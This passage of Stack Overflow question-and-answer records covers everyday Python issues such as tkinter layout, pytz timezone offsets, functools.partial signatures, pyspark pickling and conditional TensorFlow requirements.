    "AcceptedAnswer": "Currently I am investigating this feature too. I found this experimental feature explanation of setuptools which should just refer to the pyproject.toml without any need of setup.py in the end.\nRegarding dynamic behavior of setup.py, I figured out that you can set a dynamic behavior for fields under the [project] metadata\ndynamic = [\"version\"]\n\n[tool.setuptools.dynamic]\nversion = {attr = \"my_package.__version__\"}\n\nwhereat the corresponding version in this example is set in, e.g. my_package.__init__.py\n__version__ = \"0.1.0\"\n\n__all__ = [\"__version__\"]\n\nIn the end, I guess that setuptools will cover the missing setup.py execution and places the necessary egg-links for the development mode.\n"
}
{
    "Id": 71292505,
    "PostTypeId": 1,
    "Title": "TK python checkbutton RTL",
    "Body": "I have a checkbutton:\nfrom tkinter import *\nmaster = Tk()\nCheckbutton(master, text=\"Here...\").grid(row=0, sticky=W)\nmainloop()\n\nWhich looks like this:\n\nI tried to move the checkbutton to the other side (to support RTL languages), so it'll be like:\nHere...[]\nI know that I can draw a label next to the checkbutton, but this way clicking the text won't effect the checkbutton.\nHow can I do it?\n",
    "AcceptedAnswerId": 71348390,
    "AcceptedAnswer": "You can bind the left mouse button click event of the label, to a lambda construct that toggles the checkbutton -:\nlabel.bind(\"\", lambda x : check_button.toggle())\n\nThe label can then be placed before the checkbutton using grid(as mentioned in the OP at the end) -:\nfrom tkinter import *\n\nmaster = Tk()\n\nl1 = Label(master, text = \"Here...\")\ncb = Checkbutton(master)\nl1.grid(row = 0, column = 0)\ncb.grid(row = 0, column = 1, sticky=W)\n\nl1.bind(\"\", lambda x : cb.toggle())\nmainloop()\n\nThis will toggle, the checkbutton even if the label is clicked.\nOUTPUT -:\n\n\nNOTE:\nThe checkbutton, has to now be fetched as an object(cb), to be used in the lambda construct for the label's bind function callback argument. Thus, it is gridded in the next line. It is generally a good practice to manage the geometry separately, which can prevent error such as this one.\n\nAlso, as mentioned in the post linked by @Alexander B. in the comments, if this assembly is to be used multiple times, it can also be made into a class of it's own that inherits from the tkinter.Frame class -:\nclass LabeledCheckbutton(Frame):\n    def __init__(self, root, text = \"\"):\n        Frame.__init__(self, root)\n        self.checkbutton = Checkbutton(self)\n        self.label = Label(self, text = text)\n        self.label.grid(row = 0, column = 0)\n        self.checkbutton.grid(row = 0, column = 1)\n        self.label.bind('', lambda x : self.checkbutton.toggle())\n        return\n    \n    pass\n\nUsing this with grid as the geometry manager, would make the full code look like this -:\nfrom tkinter import *\n\nclass LabeledCheckbutton(Frame):\n    def __init__(self, root, text = \"\"):\n        Frame.__init__(self, root)\n        self.checkbutton = Checkbutton(self)\n        self.label = Label(self, text = text)\n        self.label.grid(row = 0, column = 0)\n        self.checkbutton.grid(row = 0, column = 1)\n        self.label.bind('', lambda x : self.checkbutton.toggle())\n        return\n    \n    pass\n\nmaster = Tk()\nlcb = LabeledCheckbutton(master, text = \"Here...\")\nlcb.grid(row = 0, sticky = W)\n\nmainloop()\n\nThe output of the above code remains consistent with that of the first approach. The only difference is that it is now more easily scalable, as an object can be created whenever needed and the same lines of code need not be repeated every time.\n"
}
{
    "Id": 72011315,
    "PostTypeId": 1,
    "Title": "PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: after installing python-certifi-win32",
    "Body": "I installed python-certifi-win32 package and after that, I am getting below error, when I import anything or pip install anything, the fail with the final error of PermissionError.\nI tried rebooting the box. It didn't work. I am unable to uninstall the package as pip is erroring out too.\nI am unable to figure out the exact reason why this error is happening. It doesn't seem to be code specific, seems related to the library I installed\nPS C:\\Users\\visha\\PycharmProjects\\master_test_runner> pip install python-certifi-win32                                                                \nTraceback (most recent call last):\n  File \"C:\\Users\\visha\\AppData\\Local\\Programs\\Python\\Python310\\lib\\importlib\\_common.py\", line 89, in _tempfile\n    os.write(fd, reader())\n  File \"C:\\Users\\visha\\AppData\\Local\\Programs\\Python\\Python310\\lib\\importlib\\abc.py\", line 371, in read_bytes\n    with self.open('rb') as strm:\n  File \"C:\\Users\\visha\\AppData\\Local\\Programs\\Python\\Python310\\lib\\importlib\\_adapters.py\", line 54, in open\n    raise ValueError()\nValueError\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"C:\\Users\\visha\\AppData\\Local\\Programs\\Python\\Python310\\lib\\runpy.py\", line 196, in _run_module_as_main\n    return _run_code(code, main_globals, None,\n  File \"C:\\Users\\visha\\AppData\\Local\\Programs\\Python\\Python310\\lib\\runpy.py\", line 86, in _run_code\n    exec(code, run_globals)\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\Scripts\\pip.exe\\__main__.py\", line 4, in \n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_internal\\cli\\main.py\", line 9, in \n    from pip._internal.cli.autocompletion import autocomplete\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_internal\\cli\\autocompletion.py\", line 10, in \n    from pip._internal.cli.main_parser import create_main_parser\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_internal\\cli\\main_parser.py\", line 8, in \n    from pip._internal.cli import cmdoptions\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_internal\\cli\\cmdoptions.py\", line 23, in \n    from pip._internal.cli.parser import ConfigOptionParser\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_internal\\cli\\parser.py\", line 12, in \n    from pip._internal.configuration import Configuration, ConfigurationError\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_internal\\configuration.py\", line 21, in \n    from pip._internal.exceptions import (\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_internal\\exceptions.py\", line 8, in \n    from pip._vendor.requests.models import Request, Response\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_vendor\\requests\\__init__.py\", line 123, in \n    from . import utils\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_vendor\\requests\\utils.py\", line 25, in \n    from . import certs\n  File \"\", line 1027, in _find_and_load\n  File \"\", line 1006, in _find_and_load_unlocked\n  File \"\", line 688, in _load_unlocked\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\wrapt\\importer.py\", line 170, in exec_module\n    notify_module_loaded(module)\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\wrapt\\decorators.py\", line 470, in _synchronized\n    return wrapped(*args, **kwargs)\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\wrapt\\importer.py\", line 136, in notify_module_loaded\n    hook(module)\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\certifi_win32\\wrapt_pip.py\", line 35, in apply_patches\n    import certifi\n  File \"\", line 1027, in _find_and_load\n  File \"\", line 1006, in _find_and_load_unlocked\n  File \"\", line 688, in _load_unlocked\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\wrapt\\importer.py\", line 170, in exec_module\n    notify_module_loaded(module)\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\wrapt\\decorators.py\", line 470, in _synchronized\n    return wrapped(*args, **kwargs)\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\wrapt\\importer.py\", line 136, in notify_module_loaded\n    hook(module)\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\certifi_win32\\wrapt_certifi.py\", line 20, in apply_patches\n    certifi_win32.wincerts.CERTIFI_PEM = certifi.where()\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\certifi\\core.py\", line 37, in where\n    _CACERT_PATH = str(_CACERT_CTX.__enter__())\n  File \"C:\\Users\\visha\\AppData\\Local\\Programs\\Python\\Python310\\lib\\contextlib.py\", line 135, in __enter__\n    return next(self.gen)\n  File \"C:\\Users\\visha\\AppData\\Local\\Programs\\Python\\Python310\\lib\\importlib\\_common.py\", line 95, in _tempfile\n    os.remove(raw_path)\nPermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\\\Users\\\\visha\\\\AppData\\\\Local\\\\Temp\\\\tmpy_tb8siv'\nPS C:\\Users\\visha\\PycharmProjects\\master_test_runner> \n\n",
    "AcceptedAnswerId": 72087091,
    "AcceptedAnswer": "I ran into the same issue today.  I corrected it by removing two *.pth files that were created when I had installed python-certifi-win32.  This prevents python-certifi-win32 from loading when python is run.\nThe files are listed below, and were located here:\nC:\\Users\\\\AppData\\Local\\Programs\\Python\\Python310\\Lib\\site-packages\n\nFiles:\npython-certifi-win32-init.pth\ndistutils-precedence.pth\n\nRemoving these files allowed me to install/uninstall other modules.\n"
}
{
    "Id": 71787974,
    "PostTypeId": 1,
    "Title": "Why does `'{x[1:3]}'.format(x=\"asd\")` cause a TypeError?",
    "Body": "Consider this:\n>>> '{x[1]}'.format(x=\"asd\")\n's'\n>>> '{x[1:3]}'.format(x=\"asd\")\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: string indices must be integers\n\nWhat could be the cause for this behavior?\n",
    "AcceptedAnswerId": 71788626,
    "AcceptedAnswer": "An experiment based on your comment, checking what value the object's __getitem__ method actually receives:\nclass C:\n    def __getitem__(self, index):\n        print(repr(index))\n\n'{c[4]}'.format(c=C())\n'{c[4:6]}'.format(c=C())\n'{c[anything goes!@#$%^&]}'.format(c=C())\nC()[4:6]\n\nOutput (Try it online!):\n4\n'4:6'\n'anything goes!@#$%^&'\nslice(4, 6, None)\n\nSo while the 4 gets converted to an int, the 4:6 isn't converted to slice(4, 6, None) as in usual slicing. Instead, it remains simply the string '4:6'. And that's not a valid type for indexing/slicing a string, hence the TypeError: string indices must be integers you got.\nUpdate:\nIs that documented? Well... I don't see something really clear, but @GACy20 pointed out something subtle. The grammar has these rules\nfield_name        ::=  arg_name (\".\" attribute_name | \"[\" element_index \"]\")*\nelement_index     ::=  digit+ | index_string\nindex_string      ::=   +\n\nOur c[4:6] is the field_name, and we're interested in the element_index part 4:6. I think it would be clearer if digit+ had its own rule with meaningful name:\nfield_name        ::=  arg_name (\".\" attribute_name | \"[\" element_index \"]\")*\nelement_index     ::=  index_integer | index_string\nindex_integer     ::=  digit+\nindex_string      ::=   +\n\nI'd say having index_integer and index_string would more clearly indicate that digit+ is converted to an integer (instead of staying a digit string), while  + would stay a string.\nThat said, looking at the rules as they are, perhaps we should think \"what would be the point of separating the digits case out of the any-characters case which would match it as well?\" and think that the point is to treat pure digits differently, presumably to convert them to an integer. Or maybe some other part of the documentation even states that digit or digits+ in general gets converted to an integer.\n"
}
{
    "Id": 71768804,
    "PostTypeId": 1,
    "Title": "Two ways to create timezone aware datetime objects (Django). Seven minutes difference?",
    "Body": "Up to now I thought both ways to create a timezone aware datetime are equal.\nBut they are not:\nimport datetime\n\nfrom django.utils.timezone import make_aware, get_current_timezone\n\nmake_aware(datetime.datetime(1999, 1, 1, 0, 0, 0), get_current_timezone())\n\ndatetime.datetime(1999, 1, 1, 0, 0, 0, tzinfo=get_current_timezone())\n\ndatetime.datetime(1999, 1, 1, 0, 0, tzinfo=)\n\ndatetime.datetime(1999, 1, 1, 0, 0, tzinfo=)\n\nIn the Django Admin GUI second way creates this (German date format dd.mm.YYYY):\n01.01.1999 00:07:00\n\nWhy are there 7 minutes difference if I use this:\ndatetime.datetime(1999, 1, 1, 0, 0, 0, tzinfo=get_current_timezone())\n\n",
    "AcceptedAnswerId": 71823301,
    "AcceptedAnswer": "This happens on Django 3.2 and lower, which rely on the pytz library. In Django 4 (unless you enable to setting to use the deprecated library), the output of the two examples you give is identical.\nIn Django 3.2 and below, the variance arises because the localised time is built in two different ways. When using make_aware, it is done by calling the localize() method on the pytz timezone instance. In the second version, it's done by passing a tzinfo object directly to the datetime constructor.\nThe difference between the two is well illustrated in this blog post:\n\nThe biggest mistake people make with pytz is simply attaching its time zones to the constructor, since that is the standard way to add a time zone to a datetime in Python. If you try and do that, the best case scenario is that you'll get something obviously absurd:\nimport pytz\nfrom datetime import datetime\n\nNYC = pytz.timezone('America/New_York')\ndt = datetime(2018, 2, 14, 12, tzinfo=NYC)\nprint(dt)\n# 2018-02-14 12:00:00-04:56\n\nWhy is the time offset -04:56 and not -05:00? Because that was the local solar mean time in New York before standardized time zones were adopted, and is thus the first entry in the America/New_York time zone. Why did pytz return that? Because unlike the standard library's model of lazily-computed time zone information, pytz takes an eager calculation approach.\nWhenever you construct an aware datetime from a naive one, you need to call the localize function on it:\ndt = NYC.localize(datetime(2018, 2, 14, 12))\nprint(dt)\n# 2018-02-14 12:00:00-05:00\n\n\nExactly the same thing is happening with your Europe/Berlin example. pytz is eagerly fetching the first entry in its database, which is a pre-1983 solar time, which was 53 minutes and 28 seconds ahead of Greenwich Mean Time (GMT). This is obviously inappropriate given the date - but the tzinfo isn't aware of the date you are using unless you pass it to localize().\nThis is the difference between your two approaches. Using make_aware correctly calls localize() on the object. Assigning the tzinfo directly to the datetime object, however, doesn't, and results in pytz using the (wrong) time zone information because it was simply the first entry for that zone in its database.\nThe pytz documentation obliquely refers to this as well:\n\nThis library only supports two ways of building a localized time. The first is to use the localize() method provided by the pytz library. This is used to localize a naive datetime (datetime with no timezone information)... The second way of building a localized time is by converting an existing localized time using the standard astimezone() method... Unfortunately using the tzinfo argument of the standard datetime constructors \u2018\u2019does not work\u2019\u2019 with pytz for many timezones.\n\nIt is actually because of these and several other bugs in the pytz implementation that Django dropped it in favour of Python's built-in zoneinfo module.\nMore from that blog post:\n\nAt the time of its creation, pytz was cleverly designed to optimize for performance and correctness, but with the changes introduced by PEP 495 and the performance improvements to dateutil, the reasons to use it are dwindling.\n... The biggest reason to use dateutil over pytz is the fact that dateutil uses the standard interface and pytz doesn't, and as a result it is very easy to use pytz incorrectly.\n\nPassing a pytz tzinfo object directly to a datetime constructor is incorrect. You must call localize() on the tzinfo class, passing it the date. The correct way to initialise the datetime in your second example is:\n> berlin = get_current_timezone()\n> berlin.localize(datetime.datetime(1999, 1, 1, 0, 0, 0))\ndatetime.datetime(1999, 1, 1, 0, 0, tzinfo=)\n\n... which matches what make_aware produces.\n"
}
{
    "Id": 71194918,
    "PostTypeId": 1,
    "Title": "when i use docker-compose to install a fastapi project, i got AssertionError:",
    "Body": "when I use docker-compose to install a fastapi project, I got AssertionError: jinja2 must be installed to use Jinja2Templates\nbut when I use env to install it, that will be run well.\nmy OS:\nUbuntu18.04STL\nmy requirements.txt:\nfastapi~=0.68.2\nstarlette==0.14.2\npydantic~=1.8.1\n\nuvicorn~=0.12.3\nSQLAlchemy~=1.4.23\n\n# WSGI\nWerkzeug==1.0.1\n\npyjwt~=1.7.0\n\n# async-exit-stack~=1.0.1\n# async-generator~=1.10\n\njinja2~=2.11.2\n\n# assert aiofiles is not None, \"'aiofiles' must be installed to use FileResponse\"\naiofiles~=0.6.0\npython-multipart~=0.0.5\n\nrequests~=2.25.0\npyyaml~=5.3.1\n# html-builder==0.0.6\nloguru~=0.5.3\napscheduler==3.7.0\n\npytest~=6.1.2\nhtml2text==2020.1.16\nmkdocs==1.2.1\n\n\nDockerfile\nFROM python:3.8\nENV PYTHONDONTWRITEBYTECODE 1\nENV PYTHONUNBUFFERED 1\n\nWORKDIR /server\nCOPY requirements.txt /server/\nRUN pip install -r requirements.txt\nCOPY . /server/\n\ndocker-compose.yml\nversion: '3.7'\n\nservices:\n  figbox_api:\n    build:\n        context: .\n        dockerfile: Dockerfile\n    command:  uvicorn app.main:app --port 8773 --host 0.0.0.0 --reload\n    volumes:\n    - .:/server\n    ports:\n    - 8773:8773\n\nDo I need to provide some other information?\nThanks\n",
    "AcceptedAnswerId": 72120645,
    "AcceptedAnswer": "I had a same problem on heroku, the error comes from Jinja2\nversion 2.11.x and it run locally but not in Heroku.\nJust install latest version of jinja2 it will work fine in your case too.\npip install Jinja2==3.1.2\nor \npip install Jinja2 --upgrade\n\n"
}
{
    "Id": 72106357,
    "PostTypeId": 1,
    "Title": "access objects in pyspark user-defined function from outer scope, avoid PicklingError: Could not serialize object",
    "Body": "How do I avoid initializing a class within a pyspark user-defined function?  Here is an example.\nCreating a spark session and DataFrame representing four latitudes and longitudes.\nimport pandas as pd\nfrom pyspark import SparkConf\nfrom pyspark.sql import SparkSession\n\nconf = SparkConf()\nconf.set('spark.sql.execution.arrow.pyspark.enabled', 'true')\nspark = SparkSession.builder.config(conf=conf).getOrCreate()\n\nsdf = spark.createDataFrame(pd.DataFrame({\n    'lat': [37, 42, 35, -22],\n    'lng': [-113, -107, 127, 34]}))\n\nHere is the Spark DataFrame\n+---+----+\n|lat| lng|\n+---+----+\n| 37|-113|\n| 42|-107|\n| 35| 127|\n|-22|  34|\n+---+----+\n\nEnriching the DataFrame with a timezone string at each latitude / longitude via the timezonefinder package.  Code below runs without errors\nfrom typing import Iterator\nfrom timezonefinder import TimezoneFinder\n\ndef func(iterator: Iterator[pd.DataFrame]) -> Iterator[pd.DataFrame]:\n    for dx in iterator:\n        tzf = TimezoneFinder()\n        dx['timezone'] = [tzf.timezone_at(lng=a, lat=b) for a, b in zip(dx['lng'], dx['lat'])]\n        yield dx\npdf = sdf.mapInPandas(func, schema='lat double, lng double, timezone string').toPandas()\n\nThe above code runs without errors and creates the pandas DataFrame below.  The issue is the TimezoneFinder class is initialized within the user-defined function which creates a bottleneck\nIn [4]: pdf\nOut[4]:\n    lat    lng         timezone\n0  37.0 -113.0  America/Phoenix\n1  42.0 -107.0   America/Denver\n2  35.0  127.0       Asia/Seoul\n3 -22.0   34.0    Africa/Maputo\n\nThe question is how to get this code to run more like below, where the TimezoneFinder class is initialized once and outside of the user-defined function.  As is, the code below generates this error PicklingError: Could not serialize object: TypeError: cannot pickle '_io.BufferedReader' object\ndef func(iterator: Iterator[pd.DataFrame]) -> Iterator[pd.DataFrame]:\n    for dx in iterator:\n        dx['timezone'] = [tzf.timezone_at(lng=a, lat=b) for a, b in zip(dx['lng'], dx['lat'])]\n        yield dx\ntzf = TimezoneFinder()\npdf = sdf.mapInPandas(func, schema='lat double, lng double, timezone string').toPandas()\n\nUPDATE - Also tried to use functools.partial and an outer function but still received same error.  That is, this approach does not work:\ndef outer(iterator, tzf):\n    def func(iterator: Iterator[pd.DataFrame]) -> Iterator[pd.DataFrame]:\n        for dx in iterator:\n            dx['timezone'] = [tzf.timezone_at(lng=a, lat=b) for a, b in zip(dx['lng'], dx['lat'])]\n            yield dx\n    return func(iterator)\ntzf = TimezoneFinder()\nouter = partial(outer, tzf=tzf)\npdf = sdf.mapInPandas(outer, schema='lat double, lng double, timezone string').toPandas()\n\n",
    "AcceptedAnswerId": 72143511,
    "AcceptedAnswer": "You will need a cached instance of the object on every worker.\nYou could do that as follows\ninstance = [None]\n\ndef func(iterator: Iterator[pd.DataFrame]) -> Iterator[pd.DataFrame]:\n    if instance[0] is None:\n        instance[0] = TimezoneFinder()\n    tzf = instance[0]\n    for dx in iterator:\n        dx['timezone'] = [tzf.timezone_at(lng=a, lat=b) for a, b in zip(dx['lng'], dx['lat'])]\n        yield dx\n\nNote that for this to work, your function would be defined within a module, to give the instance cache somewhere to live. Else you would have to hang it off some builtin module, e.g., os.instance = [].\n"
}
{
    "Id": 71564200,
    "PostTypeId": 1,
    "Title": "Python how to revert the pattern of a list rearrangement",
    "Body": "So I am rearranging a list based on an index pattern and would like to find a way to calculate the pattern I need to revert the list back to its original order.\nfor my example I am using a list of 5 items as I can work out the pattern needed to revert the list back to its original state.\nHowever this isn't so easy when dealing with 100's of list items.\ndef rearrange(pattern: list, L: list):\n    new_list = []\n    for i in pattern:\n        new_list.append(L[i-1])\n    return new_list\n\nprint(rearrange([2,5,1,3,4], ['q','t','g','x','r']))\n\n#['t', 'r', 'q', 'g', 'x']\n\nand in order to set it back to the original pattern\nI would use\nprint(rearrange([3,1,4,5,2],['t', 'r', 'q', 'g', 'x']))\n#['q', 't', 'g', 'x', 'r']\n\nWhat I am looking for is a way to calculate the pattern \"[3,1,4,5,2]\"\nregarding the above example.\nwhist running the script so that I can set the list back to its original order.\nUsing a larger example:\nprint(rearrange([18,20,10,11,13,1,9,12,16,6,15,5,3,7,17,2,19,8,14,4],['e','p','b','i','s','r','q','h','m','f','c','g','d','k','l','t','a','n','j','o']))\n#['n', 'o', 'f', 'c', 'd', 'e', 'm', 'g', 't', 'r', 'l', 's', 'b', 'q', 'a', 'p', 'j', 'h', 'k', 'i']\n\nbut I need to know the pattern to use with this new list in order to return it to its original state.\nprint(rearrange([???],['n', 'o', 'f', 'c', 'd', 'e', 'm', 'g', 't', 'r', 'l', 's', 'b', 'q', 'a', 'p', 'j', 'h', 'k', 'i']))\n#['e','p','b','i','s','r','q','h','m','f','c','g','d','k','l','t','a','n','j','o']\n\n",
    "AcceptedAnswerId": 71564272,
    "AcceptedAnswer": "This is commonly called \"argsort\". But since you're using 1-based indexing, you're off-by-one. You can get it with numpy:\n>>> pattern\n[2, 5, 1, 3, 4]\n>>> import numpy as np\n>>> np.argsort(pattern) + 1\narray([3, 1, 4, 5, 2])\n\nWithout numpy:\n>>> [1 + i for i in sorted(range(len(pattern)), key=pattern.__getitem__)]\n[3, 1, 4, 5, 2]\n\n"
}
{
    "Id": 71402387,
    "PostTypeId": 1,
    "Title": "The rationale of `functools.partial` behavior",
    "Body": "I'm wondering what the story -- whether sound design or inherited legacy -- is behind these functools.partial and inspect.signature facts (talking python 3.8 here).\nSet up:\nfrom functools import partial\nfrom inspect import signature\n\ndef bar(a, b):\n    return a / b\n\nAll starts well with the following, which seems compliant with curry-standards.\nWe're fixing a to 3 positionally, a disappears from the signature and it's value is indeed bound to 3:\nf = partial(bar, 3)\nassert str(signature(f)) == '(b)'\nassert f(6) == 0.5 == f(b=6)\n\nIf we try to specify an alternate value for a, f won't tell us that we got an unexpected keyword, but rather that it got multiple values for argument a:\nf(a=2, b=6)  # TypeError: bar() got multiple values for argument 'a'\nf(c=2, b=6)  # TypeError: bar() got an unexpected keyword argument 'c'\n\nBut now if we fix b=3 through a keyword, b is not removed from the signature, it's kind changes to keyword-only, and we can still use it (overwrite the default, as a normal default, which we couldn't do with a in the previous case):\nf = partial(bar, b=3)\nassert str(signature(f)) == '(a, *, b=3)'\nassert f(6) == 2.0 == f(6, b=3)\nassert f(6, b=1) == 6.0\n\nWhy such asymmetry?\nIt gets even stranger, we can do this:\nf = partial(bar, a=3)\nassert str(signature(f)) == '(*, a=3, b)'  # whaaa?! non-default argument follows default argument?\n\nFine: For keyword-only arguments, there can be no confusing of what parameter a default is assigned to, but I still wonder what design-thinking or constraints are behind these choices.\n",
    "AcceptedAnswerId": 71403608,
    "AcceptedAnswer": "Using partial with a Positional Argument\nf = partial(bar, 3)\n\nBy design, upon calling a function, positional arguments are assigned first. Then logically, 3 should be assigned to a with partial. It makes sense to remove it from the signature as there is no way to assign anything to it again!\nwhen you have f(a=2, b=6), you are actually doing\nbar(3, a=2, b=6)\n\nwhen you have f(2, 2), you are actually doing\nbar (3, 2, 2)\n\nWe never get rid of 3\nFor the new partial function:\n\nWe can't give a a different value with another positional argument\nWe can't use the keyword a to assign a different value to it as it is already \"filled\"\n\n\nIf there is a parameter with the same name as the keyword, then the argument value is assigned to that parameter slot. However, if the parameter slot is already filled, then that is an error.\n\nI recommend reading the function calling behavior section of pep-3102 to get a better grasp of this matter.\nUsing partial with a Keyword Argument\nf = partial(bar, b=3)\n\nThis is a different use case. We are applying a keyword argument to bar.\nYou are functionally turning\ndef bar(a, b):\n    ...\n\ninto\ndef f(a, *, b=3):\n    ...\n\nwhere b becomes a keyword-only argument\ninstead of\ndef f(a, b=3):\n    ...\n\ninspect.signature correctly reflects a design decision of partial. The keyword arguments passed to partial are designed to append additional positional arguments (source).\nNote that this behavior does not necessarily override the keyword arguments supplied with f = partial(bar, b=3), i.e., b=3 will be applied regardless of whether you supply the second positional argument or not (and there will be a TypeError if you do so). This is different from a positional argument with a default value.\n>>> f(1, 2)\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: f() takes 1 positional argument but 2 were given\n\nwhere f(1, 2) is equivalent to bar(1, 2, b=3)\nThe only way to override it is with a keyword argument\n>>> f(2, b=2)\n\nAn argument that can only be assigned with a keyword but positionally? This is a keyword-only argument. Thus (a, *, b=3) instead of (a, b=3).\nThe Rationale of Non-default Argument follows Default Argument\nf = partial(bar, a=3)\nassert str(signature(f)) == '(*, a=3, b)'  # whaaa?! non-default argument follows default argument?\n\n\nYou can't do def bar(a=3, b). a and b are so called positional-or-keyword arguments.\nYou can do def bar(*, a=3, b). a and b are keyword-only arguments.\n\nEven though semantically, a has a default value and thus it is optional, we can't leave it unassigned because b, which is a positional-or-keyword argument needs to be assigned a value if we want to use b positionally. If we do not supply a value for a, we have to use b as a keyword argument.\nCheckmate! There is no way for b to be a positional-or-keyword argument as we intended.\nThe PEP for positonal-only arguments also kind of shows the rationale behind it.\nThis also has something to do with the aforementioned \"function calling behavior\".\npartial != Currying & Implementation Details\npartial by its implementation wraps the original function while storing the fixed arguments you passed to it.\nIT IS NOT IMPLEMENTED WITH CURRYING. It is rather partial application instead of currying in the sense of functional programming. partial is essentially applying the fixed arguments first, then the arguments you called with the wrapper:\ndef __call__(self, /, *args, **keywords):\n    keywords = {**self.keywords, **keywords}\n    return self.func(*self.args, *args, **keywords)\n\nThis explains f(a=2, b=6)  # TypeError: bar() got multiple values for argument 'a'.\nSee also: Why is partial called partial instead of curry\nUnder the Hood of inspect\nThe outputs of inspect is another story.\ninspect itself is a tool that produces user-friendly outputs. For partial() in particular (and partialmethod(), similarly), it follows the wrapped function while taking the fixed parameters into account:\nif isinstance(obj, functools.partial):\n    wrapped_sig = _get_signature_of(obj.func)\n    return _signature_get_partial(wrapped_sig, obj)\n\nDo note that it is not inspect.signature's goal to show you the actual signature of the wrapped function in the AST.\ndef _signature_get_partial(wrapped_sig, partial, extra_args=()):\n    \"\"\"Private helper to calculate how 'wrapped_sig' signature will\n    look like after applying a 'functools.partial' object (or alike)\n    on it.\n    \"\"\"\n    ...\n\nSo we have a nice and ideal signature for f = partial(bar, 3)\nbut get f(a=2, b=6)  # TypeError: bar() got multiple values for argument 'a' in reality.\nFollow-up\nIf you want currying so badly, how do you implement it in Python, in the way which gives you the expected TypeError?\n"
}
{
    "Id": 71688065,
    "PostTypeId": 1,
    "Title": "Generic requirements.txt for TensorFlow on both Apple M1 and other devices",
    "Body": "I have a new MacBook with the Apple M1 chipset. To install tensorflow, I follow the instructions here, i.e., installing tensorflow-metal and tensorflow-macos instead of the normal tensorflow package.\nWhile this works fine, it means that I can't run the typical pip install -r requirements.txt as long as we have tensorflow in the requirements.txt. If we instead include tensorflow-macos, it'll lead to problems for non-M1 or even non-macOS users.\nOur library must work on all platforms. Is there a generic install command that installs the correct TensorFlow version depending on whether the computer is a M1 Mac or not? So that we can use a single requirements.txt for everyone?\nOr if that's not possible, can we pass some flag/option, e.g., pip install -r requirements.txt --m1 to install some variation?\nWhat's the simplest and most elegant solution here?\n",
    "AcceptedAnswerId": 71866908,
    "AcceptedAnswer": "According to this post Is there a way to have a conditional requirements.txt file for my Python application based on platform?\nYou can use conditionals on your requirements.txt, thus\ntensorflow==2.8.0; sys_platform != 'darwin' or platform_machine != 'arm64'\ntensorflow-macos==2.8.0; sys_platform == 'darwin' and platform_machine == 'arm64'\n\n"
}
{
    "Id": 72161257,
    "PostTypeId": 1,
    "Title": "Exclude default fields from python `dataclass` `__repr__`",
    "Body": "Summary\nI have a dataclass with 10+ fields. print()ing them buries interesting context in a wall of defaults - let's make them friendlier by not needlessly repeating those.\nDataclasses in Python\nPython's @dataclasses.dataclass() (PEP 557) provides automatic printable representations (__repr__()).\nAssume this example, based on python.org's:\nfrom dataclasses import dataclass\n\n\n@dataclass\nclass InventoryItem:\n    name: str\n    unit_price: float = 1.00\n    quantity_on_hand: int = 0\n\nThe decorator, through @dataclass(repr=True) (default) will print() a nice output:\nInventoryItem(name='Apple', unit_price='1.00', quantity_on_hand=0)\n\nWhat I want: Skip printing the defaults\nrepr It prints all the fields, including implied defaults you wouldn't want to show.\nprint(InventoryItem(\"Apple\"))\n\n# Outputs: InventoryItem(name='Apple', unit_price='1.00', quantity_on_hand=0)\n# I want: InventoryItem(name='Apple')\n\nprint(InventoryItem(\"Apple\", unit_price=\"1.05\"))\n\n# Outputs: InventoryItem(name='Apple', unit_price='1.05', quantity_on_hand=0)\n# I want: InventoryItem(name='Apple', unit_price='1.05')\n\nprint(InventoryItem(\"Apple\", quantity_on_hand=3))\n\n# Outputs: InventoryItem(name='Apple', unit_price=1.00, quantity_on_hand=3)\n# I want: InventoryItem(name='Apple', quantity_on_hand=3)\n\nprint(InventoryItem(\"Apple\", unit_price='2.10', quantity_on_hand=3))\n\n# Output is fine (everything's custom):\n# InventoryItem(name='Apple', unit_price=2.10, quantity_on_hand=3)\n\nDiscussion\nInternally, here's the machinery of dataclass repr-generator as of python 3.10.4: cls.__repr__=_repr_fn(flds, globals)) -> _recursive_repr(fn)\nIt may be the case that @dataclass(repr=False) be switched off and def __repr__(self): be added.\nIf so, what would that look like? We don't want to include the optional defaults.\nContext\nTo repeat, in practice, my dataclass has 10+ fields.\nI'm print()ing instances via running the code and repl, and @pytest.mark.parametrize when running pytest with -vvv.\nBig dataclass' non-defaults (sometimes the inputs) are impossible to see as they're buried in the default fields and worse, each one is disproportionately and distractingly huge: obscuring other valuable 